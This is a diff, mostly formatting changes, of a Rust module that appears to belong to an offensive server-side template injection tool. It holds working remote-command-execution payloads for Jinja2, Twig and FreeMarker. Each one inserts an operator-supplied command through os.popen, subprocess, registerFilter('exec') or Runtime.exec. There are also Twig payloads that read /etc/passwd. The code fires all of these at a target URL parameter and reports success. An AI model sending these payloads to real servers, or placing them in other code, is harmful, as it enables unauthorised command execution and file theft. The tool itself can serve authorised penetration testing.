@@ -7,12 +7,10 @@ fn build_client(timeout: u64, token: Option<&str>) -> Client {
         .timeout(Duration::from_secs(timeout))
         .redirect(reqwest::redirect::Policy::none());
     if let Some(t) = token {
-        builder = builder.default_headers(
-            reqwest::header::HeaderMap::from_iter([(
-                reqwest::header::AUTHORIZATION,
-                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
-            )]),
-        );
+        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
+            reqwest::header::AUTHORIZATION,
+            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
+        )]));
     }
     builder.build().unwrap_or_else(|_| Client::new())
 }
@@ -55,23 +53,38 @@ pub async fn detect(
     let mut detected = Vec::new();
 
     for (name, payload) in &probes {
-        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
-        match client.get(&test_url).send().await {
-            Ok(resp) => {
-                let body = resp.text().await.unwrap_or_default();
-                if body.contains(MATH_MARKER) {
-                    println!("{} [HIGH] SSTI detected: {} -> {}", "[!]".red().bold(), name.yellow(), MATH_MARKER);
-                    detected.push(*name);
-                }
+        let test_url = format!(
+            "{}{}{}={}",
+            url,
+            if url.contains('?') { "&" } else { "?" },
+            param,
+            payload
+        );
+        if let Ok(resp) = client.get(&test_url).send().await {
+            let body = resp.text().await.unwrap_or_default();
+            if body.contains(MATH_MARKER) {
+                println!(
+                    "{} [HIGH] SSTI detected: {} -> {}",
+                    "[!]".red().bold(),
+                    name.yellow(),
+                    MATH_MARKER
+                );
+                detected.push(*name);
             }
-            Err(_) => {}
         }
     }
 
     if detected.is_empty() {
-        println!("{} No SSTI detected with standard probes.", "[-]".yellow().bold());
+        println!(
+            "{} No SSTI detected with standard probes.",
+            "[-]".yellow().bold()
+        );
     } else {
-        println!("\n{} {} template engine(s) vulnerable:", "[*]".cyan().bold(), detected.len());
+        println!(
+            "\n{} {} template engine(s) vulnerable:",
+            "[*]".cyan().bold(),
+            detected.len()
+        );
         for name in &detected {
             println!("  {} {}", "*".cyan(), name.yellow());
         }
@@ -96,18 +109,57 @@ pub async fn jinja(
     let client = build_client(timeout, token);
 
     let payloads = [
-        ("Config dump", format!("{{{{config}}}}")),
-        ("Class walk", format!("{{{{''.__class__.__mro__[1].__subclasses__()}}}}")),
-        ("OS popen", format!("{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['os'].popen('{}').read()}}}}", 132, cmd)),
-        ("OS system", format!("{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['os'].system('{}')}}}}", 132, cmd)),
-        ("Subprocess", format!("{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['subprocess'].check_output('{}',shell=True)}}}}", 132, cmd)),
-        ("Import os", format!("{{{{__import__('os').popen('{}').read()}}}}", cmd)),
-        ("Lipsum globals", format!("{{{{lipsum.__globals__['os'].popen('{}').read()}}}}", cmd)),
-        ("Cycler globals", format!("{{{{cycler.__init__.__globals__.os.popen('{}').read()}}}}", cmd)),
+        ("Config dump", "{{config}}".to_string()),
+        (
+            "Class walk",
+            "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
+        ),
+        (
+            "OS popen",
+            format!(
+                "{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['os'].popen('{}').read()}}}}",
+                132, cmd
+            ),
+        ),
+        (
+            "OS system",
+            format!(
+                "{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['os'].system('{}')}}}}",
+                132, cmd
+            ),
+        ),
+        (
+            "Subprocess",
+            format!(
+                "{{{{''.__class__.__mro__[1].__subclasses__()[{}].__init__.__globals__['subprocess'].check_output('{}',shell=True)}}}}",
+                132, cmd
+            ),
+        ),
+        (
+            "Import os",
+            format!("{{{{__import__('os').popen('{}').read()}}}}", cmd),
+        ),
+        (
+            "Lipsum globals",
+            format!("{{{{lipsum.__globals__['os'].popen('{}').read()}}}}", cmd),
+        ),
+        (
+            "Cycler globals",
+            format!(
+                "{{{{cycler.__init__.__globals__.os.popen('{}').read()}}}}",
+                cmd
+            ),
+        ),
     ];
 
     for (name, payload) in &payloads {
-        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
+        let test_url = format!(
+            "{}{}{}={}",
+            url,
+            if url.contains('?') { "&" } else { "?" },
+            param,
+            payload
+        );
         match client.get(&test_url).send().await {
             Ok(resp) => {
                 let body = resp.text().await.unwrap_or_default();
@@ -148,17 +200,39 @@ pub async fn twig(
         ("App object", "{{app}}".to_string()),
         ("App request", "{{app.request}}".to_string()),
         ("Env", "{{{app.request.server}}}".to_string()),
-        ("Get env", "{{{app.request.server.get('HTTP_HOST')}}}".to_string()),
+        (
+            "Get env",
+            "{{{app.request.server.get('HTTP_HOST')}}}".to_string(),
+        ),
         ("File read", "{{{source('/etc/passwd')}}}".to_string()),
-        ("String file", "{{{'/etc/passwd'|file_excerpt(1,50)}}}".to_string()),
-        ("Exec via filter", "{{_self.env.registerFilter('exec')}}{{'exec'}}{{_self.env.getFilter('".to_string() + cmd + "')}}"),
+        (
+            "String file",
+            "{{{'/etc/passwd'|file_excerpt(1,50)}}}".to_string(),
+        ),
+        (
+            "Exec via filter",
+            "{{_self.env.registerFilter('exec')}}{{'exec'}}{{_self.env.getFilter('".to_string()
+                + cmd
+                + "')}}",
+        ),
         ("Debug", "{{{dump(app)}}}".to_string()),
         ("Class", "{{{[].getClass()}}}".to_string()),
-        ("OS exec", "{{_self.env.registerFilter('exec')}}{{_self.env.getFilter('".to_string() + cmd + "')}}"),
+        (
+            "OS exec",
+            "{{_self.env.registerFilter('exec')}}{{_self.env.getFilter('".to_string()
+                + cmd
+                + "')}}",
+        ),
     ];
 
     for (name, payload) in &payloads {
-        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
+        let test_url = format!(
+            "{}{}{}={}",
+            url,
+            if url.contains('?') { "&" } else { "?" },
+            param,
+            payload
+        );
         match client.get(&test_url).send().await {
             Ok(resp) => {
                 let body = resp.text().await.unwrap_or_default();
@@ -198,16 +272,39 @@ pub async fn freemarker(
     let payloads: Vec<(&str, String)> = vec![
         ("Math", "${7*7}".to_string()),
         ("Object class", "${.object?class}".to_string()),
-        ("Exec via Execute", "${'freemarker.template.utility.Execute'?new()('".to_string() + cmd + "')}"),
-        ("Exec via ObjectConstructor", "${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder',['".to_string() + cmd + "']).start()}"),
+        (
+            "Exec via Execute",
+            "${'freemarker.template.utility.Execute'?new()('".to_string() + cmd + "')}",
+        ),
+        (
+            "Exec via ObjectConstructor",
+            "${'freemarker.template.utility.ObjectConstructor'?new()('java.lang.ProcessBuilder',['"
+                .to_string()
+                + cmd
+                + "']).start()}",
+        ),
         ("API access", "${object?api.class}".to_string()),
-        ("Static exec", "${statics['java.lang.Runtime'].getRuntime().exec('".to_string() + cmd + "')}"),
-        ("Jython exec", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('".to_string() + cmd + "')}"),
+        (
+            "Static exec",
+            "${statics['java.lang.Runtime'].getRuntime().exec('".to_string() + cmd + "')}",
+        ),
+        (
+            "Jython exec",
+            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex('".to_string()
+                + cmd
+                + "')}",
+        ),
         ("Version", "${.version}".to_string()),
     ];
 
     for (name, payload) in &payloads {
-        let test_url = format!("{}{}{}={}", url, if url.contains('?') { "&" } else { "?" }, param, payload);
+        let test_url = format!(
+            "{}{}{}={}",
+            url,
+            if url.contains('?') { "&" } else { "?" },
+            param,
+            payload
+        );
         match client.get(&test_url).send().await {
             Ok(resp) => {
                 let body = resp.text().await.unwrap_or_default();
@@ -224,6 +321,9 @@ pub async fn freemarker(
         }
     }
 
-    println!("\n{} FreeMarker exploitation complete.", "[*]".cyan().bold());
+    println!(
+        "\n{} FreeMarker exploitation complete.",
+        "[*]".cyan().bold()
+    );
     Ok(())
 }
